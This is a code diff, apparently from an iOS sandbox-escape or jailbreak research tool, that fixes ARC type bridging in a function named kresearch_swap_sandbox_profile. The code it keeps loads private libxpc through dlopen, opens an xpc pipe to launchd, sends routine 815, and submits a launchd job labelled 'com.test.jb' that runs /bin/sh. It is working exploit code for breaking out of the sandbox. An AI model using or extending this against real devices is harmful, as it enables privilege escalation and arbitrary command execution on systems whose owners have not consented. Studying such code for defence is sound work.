@@ -671,8 +671,9 @@ char *kresearch_swap_sandbox_profile(void) {
         buf_append("\n  A4: xpc_pipe_routine to launchd\n");
         {
             void *xpc_h = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
-            typedef int (*xpc_pipe_routine_fn)(void *, xpc_object_t,
-                xpc_object_t *);
+            // Use void* for private API types to avoid ARC ownership
+            // qualifier issues with xpc_object_t* parameters
+            typedef int (*xpc_pipe_routine_fn)(void *, void *, void **);
             typedef void *(*xpc_pipe_create_fn)(const char *, uint64_t);
 
             xpc_pipe_routine_fn xpr = NULL;
@@ -699,11 +700,12 @@ char *kresearch_swap_sandbox_profile(void) {
                     xpc_dictionary_set_int64(msg, "routine", 815);
                     xpc_dictionary_set_int64(msg, "type", 1);
 
-                    xpc_object_t reply = NULL;
+                    void *reply_raw = NULL;
                     bc("[SWAP] A4: calling xpc_pipe_routine\n");
-                    int ret = xpr(pipe, msg, &reply);
+                    int ret = xpr(pipe, (__bridge void *)msg, &reply_raw);
                     buf_append("  xpc_pipe_routine: ret=%d\n", ret);
-                    if (reply) {
+                    if (reply_raw) {
+                        xpc_object_t reply = (__bridge xpc_object_t)reply_raw;
                         char *desc = xpc_copy_description(reply);
                         if (desc) {
                             buf_append("  Reply: %.800s\n", desc);
@@ -720,12 +722,13 @@ char *kresearch_swap_sandbox_profile(void) {
                     xpc_dictionary_set_string(msg2, "label", "com.test.jb");
                     xpc_dictionary_set_string(msg2, "program", "/bin/sh");
 
-                    reply = NULL;
+                    reply_raw = NULL;
                     bc("[SWAP] A4: submitting job\n");
-                    ret = xpr(pipe, msg2, &reply);
+                    ret = xpr(pipe, (__bridge void *)msg2, &reply_raw);
                     buf_append("  submit job: ret=%d\n", ret);
-                    if (reply) {
-                        char *desc = xpc_copy_description(reply);
+                    if (reply_raw) {
+                        xpc_object_t reply2 = (__bridge xpc_object_t)reply_raw;
+                        char *desc = xpc_copy_description(reply2);
                         if (desc) {
                             buf_append("  Reply: %.500s\n", desc);
                             free(desc);
